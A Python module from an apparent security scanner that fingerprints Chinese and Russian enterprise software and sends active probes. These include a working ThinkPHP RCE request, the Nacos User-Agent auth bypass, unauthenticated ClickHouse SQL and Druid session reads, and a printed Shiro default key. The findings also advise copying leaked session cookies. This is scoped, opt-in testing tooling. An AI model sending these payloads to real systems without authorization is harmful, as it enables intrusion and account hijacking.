"""Regional technology-stack fingerprinting + unauth exposure/RCE probes.

English-centric tooling barely fingerprints the CN/RU enterprise stacks that carry
the highest-payout pre-auth bugs. This module (a) passively fingerprints a response
for those products, and (b) runs a handful of **deterministic, non-destructive**
active checks — a benign `md5()` echo for ThinkPHP RCE, the Nacos `User-Agent`
auth-bypass differential, the Shiro `rememberMe=deleteMe` tell, and unauth-exposure
reads for Druid / 1C-Bitrix / ClickHouse. Exploitation (gadget chains, shells) is
never sent — that is handed to Strix.

Sources: FreeBuf / Seebug / AnQuanKe (CN), Habr / Wiz (RU/ClickHouse). See
docs/RESEARCH_GAPS.md Theme 4.
"""

from __future__ import annotations

import hashlib
from collections.abc import Callable
from dataclasses import dataclass, field

from ..net.http import HttpClient

# Passive fingerprints over ONE response: (product, where, needle). `where` is
# "body", "cookie" (any Set-Cookie), or "header:<name>".
_SIGNATURES: list[tuple[str, str, str]] = [
    ("1C-Bitrix", "body", "/bitrix/js/"),
    ("1C-Bitrix", "body", "bitrix_sessid"),
    ("1C-Bitrix", "cookie", "bitrix_sm_"),
    ("ThinkPHP", "body", "thinkphp"),
    ("ThinkPHP", "header:x-powered-by", "thinkphp"),
    ("Apache Shiro", "cookie", "rememberme"),
    ("Nacos", "body", "nacos"),
    ("Alibaba Druid", "body", "druid stat index"),
    ("Weaver e-cology", "cookie", "ecology_jsessionid"),
    ("Seeyon OA", "body", "/seeyon/"),
    ("Yonyou NC", "body", "yonyou"),
    ("ClickHouse", "body", "clickhouse"),
    ("Shiro/Spring", "header:server", "shiro"),
    ("ChromaDB", "body", "chroma"),
    ("Weaviate", "body", "weaviate"),
    ("Qdrant", "body", "qdrant"),
    # 2026-07-24 survey: CN enterprise stacks
    ("RuoYi", "body", "/ruoyi/"),
    ("RuoYi", "body", "ruoyi"),
    ("RuoYi", "body", "/system/"),
    ("JeecgBoot", "body", "/jeecg-boot/"),
    ("JeecgBoot", "body", "jeecg"),
    ("JeecgBoot", "body", "/jmreport/"),
    ("JeecgBoot", "body", "/sys/"),
    ("JeecgBoot", "body", "/online/"),
    ("DedeCMS", "body", "/dede/"),
    ("DedeCMS", "body", "dedecms"),
    ("DedeCMS", "body", "/member/"),
    ("PbootCMS", "body", "/apps/"),
    ("PbootCMS", "body", "pbootcms"),
    ("帝国CMS", "body", "/e/admin/"),
    ("帝国CMS", "body", "empirecms"),
    # 2026-07-24 survey: RU CMS
    ("NetCat CMS", "body", "/netcat/"),
    ("NetCat CMS", "body", "netcat"),
    ("NetCat CMS", "header:x-powered-by", "netcat"),
]


@dataclass
class StackResult:
    url: str
    detected: list[str] = field(default_factory=list)
    findings: list[dict] = field(default_factory=list)
    error: str | None = None


def match_stack_signatures(*, body: str, headers: dict[str, str],
                           set_cookies: list[str]) -> list[str]:
    """Passive fingerprint: which regional products does this response indicate?"""

    low_body = (body or "").lower()
    low_hdr = {k.lower(): (v or "").lower() for k, v in headers.items()}
    cookies = " ".join(set_cookies).lower()
    found: list[str] = []
    for product, where, needle in _SIGNATURES:
        hit = False
        if where == "body":
            hit = needle in low_body
        elif where == "cookie":
            hit = needle in cookies
        elif where.startswith("header:"):
            hit = needle in low_hdr.get(where.split(":", 1)[1], "")
        if hit and product not in found:
            found.append(product)
    return found


async def _fetch(client, url, scope_check, **kw):
    return await client.fetch(url, timeout=12.0, follow_redirects=True,
                              scope_check=scope_check, **kw)


async def _probe_thinkphp(client, base, scope_check) -> dict | None:
    marker = "x7k2q9"  # neutral marker — no tool name in the RCE payload
    expected = hashlib.md5(marker.encode()).hexdigest()  # noqa: S324 - benign RCE proof, not crypto
    payload = ("/index.php?s=/index/\\think\\app/invokefunction"
               f"&function=call_user_func_array&vars[0]=md5&vars[1][]={marker}")
    r = await _fetch(client, base.rstrip("/") + payload, scope_check)
    if r.status is not None and expected in r.text(limit=20_000):
        return {"product": "ThinkPHP", "severity": "critical", "verdict": "confirmed",
                "issue": "ThinkPHP invokefunction RCE",
                "detail": f"benign md5('{marker}') evaluated server-side → {expected} (CVE-2018-20062)"}
    return None


async def _probe_nacos(client, base, scope_check) -> dict | None:
    path = "/nacos/v1/auth/users?pageNo=1&pageSize=1"
    normal = await _fetch(client, base.rstrip("/") + path, scope_check)
    bypass = await _fetch(client, base.rstrip("/") + path, scope_check,
                          headers={"User-Agent": "Nacos-Server"})
    if bypass.status == 200 and normal.status in (401, 403):
        body = bypass.text(limit=20_000)
        if "pageItems" in body or '"username"' in body:
            return {"product": "Nacos", "severity": "high", "verdict": "confirmed",
                    "issue": "Nacos auth bypass (User-Agent: Nacos-Server)",
                    "detail": "user list returned to the Nacos-Server UA but 401/403 without it "
                              "(CVE-2021-29441)"}
    return None


async def _probe_shiro(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/", scope_check,
                     headers={"Cookie": "rememberMe=1"})
    setc = " ".join(r.get_all("set-cookie")).lower()
    if "remembeme=deleteme" in setc or "rememberme=deleteme" in setc:
        return {"product": "Apache Shiro", "severity": "medium", "verdict": "fingerprint",
                "issue": "Apache Shiro rememberMe present",
                "detail": "response set rememberMe=deleteMe → Shiro; test the default-key "
                          "deserialization (Shiro-550, CVE-2016-4437) with Strix"}
    return None


async def _probe_druid(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/druid/index.html", scope_check)
    body = r.text(limit=20_000).lower() if r.status == 200 else ""
    if not ("druid stat index" in body or "druid-min.js" in body):
        return None
    # Upgrade: /druid/websession.json leaks LIVE session objects (SESSIONID, principal),
    # so an attacker copies the freshest cookie → authenticated backend access.
    ws = await _fetch(client, base.rstrip("/") + "/druid/websession.json", scope_check)
    ws_body = ws.text(limit=20_000) if ws.status == 200 else ""
    if ws.status == 200 and "SESSIONID" in ws_body and ("Principal" in ws_body or "LastAccessTime" in ws_body):
        return {"product": "Alibaba Druid", "severity": "high", "verdict": "confirmed",
                "issue": "Druid monitor session leak (websession.json)",
                "detail": "/druid/websession.json leaked live sessions (SESSIONID + principal) — copy the "
                          "freshest SESSIONID cookie for authenticated backend access; /druid/sql.json "
                          "also leaks server SQL. Replay the cookie via Strix"}
    return {"product": "Alibaba Druid", "severity": "medium", "verdict": "confirmed",
            "issue": "Druid monitor exposed unauthenticated",
            "detail": "/druid/index.html reachable — check /druid/websession.json (live sessions) and "
                      "/druid/sql.json (server SQL)"}


async def _probe_bitrix(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/bitrix/admin/index.php", scope_check)
    body = r.text(limit=20_000).lower() if r.status == 200 else ""
    # Require the distinctive "bitrix" token (the /bitrix/ asset paths + BITRIX cookies always
    # carry it). The bare Russian auth stem "авторизац" alone matched any Russian login page.
    if r.status == 200 and "bitrix" in body:
        return {"product": "1C-Bitrix", "severity": "low", "verdict": "exposed",
                "issue": "Bitrix admin panel reachable",
                "detail": "/bitrix/admin/ returned 200 — enumerate module CVEs (e.g. "
                          "vote-module CVE-2022-27228) via Strix"}
    return None


async def _probe_clickhouse(client, base, scope_check) -> dict | None:
    # Only meaningful when the target points at the ClickHouse HTTP port (8123).
    r = await _fetch(client, base.rstrip("/") + "/?query=SELECT%201", scope_check)
    if r.status == 200 and r.text(limit=200).strip() == "1":
        return {"product": "ClickHouse", "severity": "critical", "verdict": "confirmed",
                "issue": "unauthenticated ClickHouse HTTP interface",
                "detail": "SELECT 1 executed with no auth — full DB read via /play (cf. the Wiz "
                          "DeepSeek leak)"}
    return None


async def _probe_chroma(client, base, scope_check) -> dict | None:
    # Standalone vector store: unauth heartbeat, and ALL versions since 1.0.0 are
    # pre-auth RCE via ChromaToast (CVE-2026-45829, CVSS 10, unpatched at disclosure).
    r = await _fetch(client, base.rstrip("/") + "/api/v2/heartbeat", scope_check)
    if r.status == 200 and "nanosecond heartbeat" in r.text(limit=2000).lower():
        vr = await _fetch(client, base.rstrip("/") + "/api/v2/version", scope_check)
        ver = vr.text(limit=200).strip().strip('"') if vr.status == 200 else "?"
        return {"product": "ChromaDB", "severity": "critical", "verdict": "confirmed",
                "issue": "unauthenticated ChromaDB vector store",
                "detail": f"/api/v2/heartbeat answered with no auth (version {ver}) — every version since "
                          "1.0.0 is pre-auth RCE via ChromaToast (CVE-2026-45829, CVSS 10, unpatched); "
                          "hand the model-load PoC to Strix, never in-scan"}
    return None


async def _probe_weaviate(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/v1/meta", scope_check)
    low = r.text(limit=5000).lower() if r.status == 200 else ""
    if r.status == 200 and '"hostname"' in low and ('"version"' in low or '"modules"' in low):
        return {"product": "Weaviate", "severity": "high", "verdict": "exposed",
                "issue": "unauthenticated Weaviate vector store",
                "detail": "/v1/meta readable with no auth — objects and their (invertible) embeddings are "
                          "exposed; the GraphQL Get{} API is readable too. Bulk read → Strix"}
    return None


async def _probe_qdrant(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/collections", scope_check)
    low = r.text(limit=5000).lower() if r.status == 200 else ""
    if r.status == 200 and '"result"' in low and '"collections"' in low and '"status"' in low:
        return {"product": "Qdrant", "severity": "high", "verdict": "exposed",
                "issue": "unauthenticated Qdrant vector store",
                "detail": "/collections listed with no API key — vectors and their payloads are exposed. "
                          "Bulk read → Strix"}
    return None


# 2026-07-24 survey: RuoYi (若依) — CN Spring Boot + Vue low-code framework
async def _probe_ruoyi(client, base, scope_check) -> dict | None:
    # Check for exposed RuoYi paths — /ruoyi/ system user list, /system/user/ unauth
    r = await _fetch(client, base.rstrip("/") + "/system/user/list", scope_check)
    if r.status == 200:
        body = r.text(limit=5000)
        if '"rows"' in body or '"total"' in body or '"userName"' in body:
            return {"product": "RuoYi", "severity": "high", "verdict": "confirmed",
                    "issue": "RuoYi user list exposed unauthenticated",
                    "detail": "/system/user/list returned user data without auth — RuoYi (若依) framework "
                              "bundles Shiro with a default AES key (kPH+bIxk5D2deZiIxcaaaA==); test Shiro-550 "
                              "rememberMe deser via Strix"}
    # Check for Shiro rememberMe on the RuoYi login page
    r2 = await _fetch(client, base.rstrip("/") + "/login", scope_check,
                     headers={"Cookie": "rememberMe=1"})
    setc = " ".join(r2.get_all("set-cookie")).lower()
    if "rememberme=deleteme" in setc or "remembeme=deleteme" in setc:
        return {"product": "RuoYi", "severity": "medium", "verdict": "fingerprint",
                "issue": "RuoYi + Apache Shiro detected (rememberMe)",
                "detail": "RuoYi framework detected with Shiro rememberMe — test default-key deser "
                          "(Shiro-550, CVE-2016-4437) with the CN default-key wordlist via Strix"}
    return None


# 2026-07-24 survey: JeecgBoot — CN Spring Boot low-code platform (41k GitHub stars)
async def _probe_jeecg(client, base, scope_check) -> dict | None:
    # Check for exposed jmreport (common JeecgBoot path)
    r = await _fetch(client, base.rstrip("/") + "/jmreport/list", scope_check)
    if r.status == 200 and ("jmreport" in r.text(limit=5000).lower() or "jeecg" in r.text(limit=5000).lower()):
        return {"product": "JeecgBoot", "severity": "high", "verdict": "confirmed",
                "issue": "JeecgBoot jmreport exposed unauthenticated",
                "detail": "/jmreport/list reachable without auth — JeecgBoot (41k stars, widely used by CN "
                          "gov/enterprise) has queryFieldBySql RCE and v3.9.1 AIRAG-MCP command-exec. "
                          "Test via Strix"}
    # Check for online module (v3.0-3.7.0 file-operation vulns)
    r2 = await _fetch(client, base.rstrip("/") + "/online/cgform/api/", scope_check)
    if r2.status == 200 and ("online" in r2.text(limit=5000).lower() or "cgform" in r2.text(limit=5000).lower()):
        return {"product": "JeecgBoot", "severity": "medium", "verdict": "exposed",
                "issue": "JeecgBoot online module exposed",
                "detail": "/online/cgform/api/ reachable — v3.0-3.7.0 file-operation vulns; v3.9.1 "
                          "AIRAG-MCP command-exec (MCP module for AI-RAG). Test via Strix"}
    return None


# Gated probes — send a real active primitive that the server executes, reads
# protected data, or bypasses auth. Each does more than passive fingerprint, so
# all are opt-in via `include_rce_probes=True` on `probe_stack` / `stack_probe`.
# (Audit 2026-07-27: WE17 ThinkPHP RCE + WE18 Nacos auth-bypass/user-list read
# + WE19 ClickHouse unauth SQL exec + WE20 Druid live-session read + WE21 RuoYi
# user-list read — all reclassified out of the passive tier.)
_RCE_PROBES = (_probe_thinkphp,)
_AUTH_BYPASS_PROBES = (_probe_nacos,)        # CVE-2021-29441 UA-bypass + user-list read
_DATA_READ_PROBES = (_probe_clickhouse, _probe_druid, _probe_ruoyi)  # unauth SQL / sessions / user list
_GATED_PROBES = _RCE_PROBES + _AUTH_BYPASS_PROBES + _DATA_READ_PROBES

# Passive / differential probes — fingerprint only, no code exec / no data read.
_PASSIVE_PROBES = (_probe_shiro, _probe_bitrix,
                   _probe_chroma, _probe_weaviate, _probe_qdrant,
                   _probe_jeecg)

_ACTIVE_PROBES = _GATED_PROBES + _PASSIVE_PROBES


async def probe_stack(client: HttpClient, base_url: str, *,
                      scope_check: Callable[[str], bool] | None = None,
                      include_rce_probes: bool = False) -> StackResult:
    """Fingerprint the base page, then run the deterministic unauth stack probes.

    Gated probes (ThinkPHP RCE echo, Nacos auth-bypass + user-list read,
    ClickHouse unauth SQL exec, Druid live-session read, RuoYi user-list read)
    are skipped unless ``include_rce_probes=True`` — they send a real active
    primitive (code execution / auth bypass / data read), not just a passive
    fingerprint. Passive/differential probes (Shiro, Bitrix, Chroma, Weaviate,
    Qdrant, Jeecg) always run.
    """

    result = StackResult(url=base_url)
    home = await _fetch(client, base_url, scope_check)
    if home.status is not None:
        result.detected = match_stack_signatures(
            body=home.text(limit=100_000), headers=home.headers_map(),
            set_cookies=home.get_all("set-cookie"))
    # Passive probes ALWAYS run (docstring contract); the gated ones run IN ADDITION when
    # include_rce_probes is set. (Was `_GATED_PROBES if include_rce_probes else _PASSIVE_PROBES`,
    # which SKIPPED every passive detection — Shiro/Bitrix/Chroma/Weaviate/Qdrant/Jeecg —
    # whenever RCE probes were enabled: a silent false negative.)
    probes = _ACTIVE_PROBES if include_rce_probes else _PASSIVE_PROBES
    for probe in probes:
        try:
            hit = await probe(client, base_url, scope_check)
        except Exception:  # one probe must never sink the sweep
            hit = None
        if hit is not None:
            result.findings.append(hit)
            if hit["product"] not in result.detected:
                result.detected.append(hit["product"])
    return result
